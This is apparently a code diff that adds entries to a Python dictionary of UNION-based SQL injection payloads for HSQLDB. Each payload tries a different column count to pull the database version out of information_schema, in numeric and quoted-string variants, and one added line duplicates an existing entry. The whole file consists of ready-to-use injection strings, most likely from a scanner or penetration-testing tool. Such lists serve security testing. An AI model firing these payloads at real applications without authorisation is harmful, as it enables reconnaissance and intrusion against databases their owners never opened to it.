@@ -30,6 +30,8 @@ injections = {
         "1 union select null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
         "1 union select null,character_value,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
         "1 union select character_value,null,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
         "1 union select null,null,null,null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
     ],
     "hsqldb_str": [
@@ -43,6 +45,9 @@ injections = {
         "1' union select null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
         "1' union select null,character_value,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
         "1' union select character_value,null,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,null,null,null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
         "1' union select null,null,null,null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
     ],
 }
